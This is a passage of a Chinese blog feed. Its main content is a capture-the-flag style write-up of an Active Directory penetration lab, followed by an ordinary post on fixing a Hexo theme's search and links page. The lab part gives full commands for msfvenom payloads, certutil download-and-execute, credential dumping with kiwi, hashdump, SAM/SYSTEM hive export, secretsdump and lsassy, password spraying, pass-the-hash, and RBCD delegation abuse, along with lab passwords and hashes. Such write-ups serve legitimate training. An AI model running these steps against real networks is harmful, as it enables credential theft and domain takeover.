class="line"><span class="string">172.16.34.23:445 open</span></span><br><span class="line"><span class="string">172.16.34.5:445 open</span></span><br><span class="line"><span class="string">172.16.34.23:139 open</span></span><br><span class="line"><span class="string">172.16.34.23:135 open</span></span><br><span class="line"><span class="string">172.16.34.5:139 open</span></span><br><span class="line"><span class="string">172.16.34.5:135 open</span></span><br><span class="line"><span class="string">172.16.34.5:88 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 7</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetBios 172.16.34.5     [+] DC:AOSELUAUTO\ASLSRVAD05   </span></span><br><span class="line"><span class="string">[*] NetBios 172.16.34.23    AOSELUAUTO\ASLSRVFS02         </span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.16.34.23</span></span><br><span class="line"><span class="string">   [-&gt;]ASLSRVFS02</span></span><br><span class="line"><span class="string">   [-&gt;]172.16.34.23</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.16.34.5</span></span><br><span class="line"><span class="string">   [-&gt;]ASLSRVAD05</span></span><br><span class="line"><span class="string">   [-&gt;]172.16.34.5</span></span><br><span class="line"><span class="string">已完成 7/7</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 8.095804082s</span></span><br></pre></td></tr></table></figure><p>接着找到了Mysql</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/8.png" alt="1"></p><p>MDUT链接上去</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/9.png" alt="1"></p><p>UDF提权之后仍然不是system权限，看到有<strong>SeImpersonatePrivilege</strong>可以利用，准备上线msf，现在生成<code>bind.exe</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure><p>到入口机，再用sqlserver下载执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> python3 -m http.server 9999 &gt; agent.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://172.16.53.30:9999/bind.exe C:\\Users\\public\\bind.exe</span><br><span class="line">C:\\Users\\public\\bind.exe</span><br></pre></td></tr></table></figure><p>链接上去，提权，hashdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 172.16.36.21 </span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得NTHash</span></span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/10.png" alt="1"></p><p>wmi没连接上，直接用msf里面的shell功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d41d2c4614bf18fa34726d4c1ba69fc2:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\desktop\</span><br><span class="line"><span class="built_in">type</span> flag.txt</span><br></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>看看登录会话或者注册表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br><span class="line"></span><br><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span></span><br><span class="line"><span class="comment"># 或者直接用msf里面的模块</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/11.png" alt="1"></p><p>发现自动登录用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 172.16.34.23 -u EthanMorris -p <span class="string">&#x27;DROCV4?LtyCp&#x27;</span> --shares</span><br><span class="line">nxc smb 172.16.34.5 -u EthanMorris -p <span class="string">&#x27;DROCV4?LtyCp&#x27;</span> --shares</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/12.png" alt="1"></p><p>发现对<strong>Aoselu FileService</strong>有读写权限，并且是域用户，收集域内信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u EthanMorris -p <span class="string">&#x27;DROCV4?LtyCp&#x27;</span>  -d aoseluauto.com -ns 172.16.34.5 -c all --auth-method ntlm --dns-tcp --zip</span><br></pre></td></tr></table></figure><p>用smbclient链接下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbclient aoseluauto.com/EthanMorris:<span class="string">&#x27;DROCV4?LtyCp&#x27;</span>@172.16.34.23</span><br><span class="line"></span><br><span class="line">shares</span><br><span class="line">use FileService</span><br><span class="line"><span class="built_in">cd</span> IT Resources</span><br><span class="line"><span class="built_in">cd</span> Ops Scripts</span><br></pre></td></tr></table></figure><p>找到很多ps1文件</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/13.png" alt="1"></p><p>下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lcd /tmp</span><br><span class="line"></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line"></span><br><span class="line">mget *.ps1</span><br></pre></td></tr></table></figure><p>里面有很多域用户和他们的密码，整理如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&quot;aoseluauto\svc_bakadm01&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;k3!8Fa&amp;Sq8Z6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$remoteUser</span> = <span class="string">&quot;aoseluauto\\svc_netadm03&quot;</span></span><br><span class="line"><span class="variable">$remotePass</span> = ConvertTo-SecureString <span class="string">&quot;0&amp;8SwSc=Ok%2&quot;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line"><span class="variable">$backupUser</span> = <span class="string">&quot;aoseluauto\\svc_bakadm02&quot;</span></span><br><span class="line"><span class="variable">$backupPassPlain</span> = <span class="string">&quot;CYNpR5i@Z?_=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$backupUser</span> = <span class="string">&quot;aoseluauto\\svc_webadm02&quot;</span></span><br><span class="line"><span class="variable">$backupPass</span> = ConvertTo-SecureString <span class="string">&quot;WebAdmPass789!&quot;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line"><span class="variable">$remoteUser</span> = <span class="string">&quot;aoseluauto\\svc_netadm03&quot;</span></span><br><span class="line"><span class="variable">$remotePass</span> = ConvertTo-SecureString <span class="string">&quot;0&amp;8SwSc=Ok%2&quot;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line"><span class="variable">$domainAdminUser</span> = <span class="string">&quot;aoseluauto\\svc_adm01&quot;</span></span><br><span class="line"><span class="variable">$domainAdminPassword</span> = ConvertTo-SecureString <span class="string">&quot;_7zg9QFlCTns&quot;</span> -AsPlainText -Force</span><br></pre></td></tr></table></figure><p>喷洒攻击<strong>AOSELUAUTO\ASLSRVFS02</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.34.23 -u users.txt -p passwords.txt</span><br><span class="line">netexec rdp 172.16.34.23 -u users.txt -p passwords.txt </span><br></pre></td></tr></table></figure><p>只有<code>svc_bakadm01\k3!8Fa&amp;Sq8Z6</code>可以用，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 172.16.34.23 -u svc_bakadm01 -p <span class="string">&#x27;k3!8Fa&amp;Sq8Z6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span> /priv</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/14.png" alt="1"></p><p><strong>SeBackupPrivilege</strong>权限，因为这里可不是DC嗷，不能卷影拷贝攻击，但是可以转储注册表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> C:\Users\svc_bakadm01\Documents\dump</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM      C:\Users\svc_bakadm01\Documents\dump\SAM.hive</span><br><span class="line">reg save HKLM\SYSTEM   C:\Users\svc_bakadm01\Documents\dump\SYSTEM.hive</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> C:\Users\svc_bakadm01\Documents\dump</span><br><span class="line"><span class="built_in">cd</span> dump</span><br><span class="line">download SAM.hive </span><br><span class="line">download SYSTEM.hive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL</span><br></pre></td></tr></table></figure><p>SECURITY 权限不够emm，但是就用system和sam也可以得到管理员的<code>NThash</code>了</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/15.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:74aaf464e1a7a75f2123ada1dd62edab:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x <span class="string">&quot;cd C:\Users\Administrator\desktop\ &amp;&amp; dir&quot;</span></span><br><span class="line"></span><br><span class="line">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x <span class="string">&quot;type C:\Users\Administrator\desktop\flag.txt.txt&quot;</span></span><br></pre></td></tr></table></figure><p>拿到flag3之后，试试用这个hash进行本地转储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -M lsassy</span><br></pre></td></tr></table></figure><p>成功得到新的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aoseluauto.com\svc_monadm01</span><br><span class="line">96Mr!je39y_p</span><br><span class="line">ab232c3cf9f4b7cf27602082b04f306b</span><br></pre></td></tr></table></figure><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/16.png" alt="1"></p><p>这个用户对域控有WriteDacl权限，可以打RBCD，先添加用户给这个主机完全控制权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dacledit -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal <span class="string">&#x27;svc_monadm01&#x27;</span> -target-dn <span class="string">&#x27;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5</span><br></pre></td></tr></table></figure><p>再者就是正常流程了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5 -computer-name <span class="string">&#x27;TEST6$&#x27;</span> -computer-pass <span class="string">&#x27;P@ssw0rd&#x27;</span></span><br><span class="line"></span><br><span class="line">impacket-rbcd <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5 -action write -delegate-to <span class="string">&#x27;ASLSRVAD05$&#x27;</span> -delegate-from <span class="string">&#x27;TEST6$&#x27;</span></span><br><span class="line"></span><br><span class="line">impacket-getST aoseluauto.com/<span class="string">&#x27;TEST6$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate Administrator -dc-ip 172.16.34.5</span><br></pre></td></tr></table></figure><p>失败了报错为<code>KRB_AP_ERR_SKEW(Clock skew too great)</code>，和域控同步时间即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ntpsec-ntpdate</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> ntpdate 172.16.34.5</span><br><span class="line"></span><br><span class="line">impacket-getST aoseluauto.com/<span class="string">&#x27;TEST6$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate Administrator -dc-ip 172.16.34.5</span><br></pre></td></tr></table></figure><p><code>KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</code>现在又出现了这样的错误，当前模拟的用户<code>Administrator</code>被禁用掉了。换任何一个管理员用户都可以</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/17.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST aoseluauto.com/<span class="string">&#x27;TEST6$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate SVC_NETADM02 -dc-ip 172.16.34.5</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=SVC_NETADM02@cifs_ASLSRVAD05.aoseluauto.com@AOSELUAUTO.COM.ccache</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/hosts</span><br><span class="line">172.16.34.5 ASLSRVAD05.aoseluauto.com</span><br><span class="line"></span><br><span class="line">impacket-wmiexec -k -no-pass ASLSRVAD05.aoseluauto.com -dc-ip 172.16.34.5</span><br><span class="line"><span class="built_in">cd</span> C:\Users\Administrator\desktop\</span><br><span class="line"><span class="built_in">type</span> flag.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Java反序列化header打入内存马、SeImpersonatePrivilege提权、msf上线、SeBackupPrivilege转储注册表、WriteDacl打RBCD</summary>
    
    
    
    <category term="春秋云镜" scheme="https://baozongwi.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
    
    <category term="Pentest" scheme="https://baozongwi.xyz/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>next主题优化(bug修复)</title>
    <link href="https://baozongwi.xyz/posts/65530.html"/>
    <id>https://baozongwi.xyz/posts/65530.html</id>
    <published>2025-08-10T02:04:10.000Z</published>
    <updated>2025-08-11T07:56:36.102Z</updated>
    
    <content type="html"><![CDATA[<p>在我换了新主题之后，我发现有一个非常影响我个人使用的bug，就是搜索功能缺陷。打个比方，我有200篇文章，但是他貌似是只能检索前100篇，去年写的100篇就完全搜索不到了，并且每个主题好像都有bug是说搜索关键词之后，文章内容和文章标题优先级是等同的，这个非常不好，因为大部分技术就这样了，比方说php，在绝大多数文章里面都会有，这个要修复。</p><p>再者就是经典的友链环节了，这次我新增会和往常不一样，其他时候我是修改、增加主题的源文件。显而易见的问题就是现在的主题更新还挺勤快，一更新就要重新来，前几日 3a0-Eminem师傅给我提及到了一个关键点，就是markdown是支持html语法的。（把这事给忘了），那我们就可以直接嵌入一个页面，而且也不会和主题之间也不会有明显的嵌入感</p><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>安装插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>在博客根目录的<code>__config.yml</code>中增加</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="comment"># path: search.xml</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.json</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure><p>注意，是<code>json</code>，<code>xml</code>有部分影响对于本次bug产生，这样子已经能搜索部分文章了，但是并没把bug修复，还有一个重要的点就是修改插件函数，打开<code>D:\blog\node_modules\hexo-generator-searchdb\lib\json_generator.js</code>，修改为如下代码，将正则问题修复即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">locals</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="variable language_">this</span>.<span class="property">config</span>;</span><br><span class="line">  <span class="keyword">var</span> database = <span class="built_in">require</span>(<span class="string">&quot;./database&quot;</span>)(locals, config);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ---------------------------------------------新增修改</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">reconvert</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    str = str.<span class="title function_">replace</span>(<span class="regexp">/(\\u)(\w&#123;1,4&#125;)/gi</span>, <span class="keyword">function</span> (<span class="params">$0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="built_in">escape</span>($0).<span class="title function_">replace</span>(<span class="regexp">/(%5Cu)(\w&#123;1,4&#125;)/g</span>, <span class="string">&quot;$2&quot;</span>), <span class="number">16</span>)</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">    str = str.<span class="title function_">replace</span>(<span class="regexp">/(&amp;#x)(\w&#123;1,4&#125;);/gi</span>, <span class="keyword">function</span> (<span class="params">$0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="built_in">escape</span>($0).<span class="title function_">replace</span>(<span class="regexp">/(%26%23x)(\w&#123;1,4&#125;)(%3B)/g</span>, <span class="string">&quot;$2&quot;</span>), <span class="number">16</span>)</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">    str = str.<span class="title function_">replace</span>(<span class="regexp">/(&amp;#)(\d&#123;1,6&#125;);/gi</span>, <span class="keyword">function</span> (<span class="params">$0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="built_in">escape</span>($0).<span class="title function_">replace</span>(<span class="regexp">/(%26%23)(\d&#123;1,6&#125;)(%3B)/g</span>, <span class="string">&quot;$2&quot;</span>))</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">  &#125;</span><br><span class="line">  database.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">    item.<span class="property">content</span> = <span class="title function_">reconvert</span>(item.<span class="property">content</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// -----------------------------------------------</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">path</span>: config.<span class="property">search</span>.<span class="property">path</span>,</span><br><span class="line">    <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(database),</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p>首先在md文件里面加<code>type: links</code>，然后写文件的时候注意里面的html是会被<strong>Nunjucks</strong>解析的，为了防止解析可以加raw</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;links-root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span>&#123;<span class="attr">--gap</span>:<span class="number">16px</span>;<span class="attr">--radius</span>:<span class="number">14px</span>;<span class="attr">--card-bg</span>:<span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.7</span>);<span class="attr">--card-border</span>:<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.06</span>);<span class="attr">--card-hover-bg</span>:<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.04</span>);<span class="attr">--shadow</span>:<span class="number">0</span> <span class="number">6px</span> <span class="number">18px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.06</span>);<span class="attribute">margin</span>:<span class="number">0</span> auto;<span class="attribute">max-width</span>:<span class="number">1100px</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.links-category</span>&#123;<span class="attribute">margin</span>:<span class="number">28px</span> <span class="number">0</span> <span class="number">22px</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.links-category</span> <span class="selector-tag">h2</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span> <span class="number">0</span> <span class="number">12px</span>;<span class="attribute">font-size</span>:<span class="number">1.25rem</span>;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">line-height</span>:<span class="number">1.2</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.links-grid</span>&#123;<span class="attribute">display</span>:grid;<span class="attribute">grid-template-columns</span>:<span class="built_in">repeat</span>(<span class="number">4</span>,<span class="built_in">minmax</span>(<span class="number">0</span>,<span class="number">1</span>fr));<span class="attribute">gap</span>:<span class="built_in">var</span>(--gap)&#125;</span></span><br><span class="line"><span class="language-css">  <span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">768px</span>)&#123;<span class="selector-id">#links-root</span> <span class="selector-class">.links-grid</span>&#123;<span class="attribute">grid-template-columns</span>:<span class="built_in">repeat</span>(<span class="number">2</span>,<span class="built_in">minmax</span>(<span class="number">0</span>,<span class="number">1</span>fr))&#125;&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.friend-card</span>&#123;<span class="attribute">display</span>:block;<span class="attribute">text-decoration</span>:none;<span class="attribute">color</span>:inherit;<span class="attribute">border-radius</span>:<span class="built_in">var</span>(--radius);<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="built_in">var</span>(--card-border);<span class="attribute">background</span>:<span class="built_in">var</span>(--card-bg);<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">transition</span>:transform .<span class="number">15s</span> ease,box-shadow .<span class="number">15s</span> ease,background .<span class="number">2s</span>&#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#links-root</span> <span class="selector-class">.friend-card</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">background</span>:<span class="built_in">var</span>(--card-hover-bg);<span class="attribute">transform</span>:<span class="built_in">translateY</span>(-<span class="number">2px</span>);<span class="attribute">box-shadow</span>:<span class="built_in">var</span>(--shadow)&#125;</span></span><br><span class="line"><span 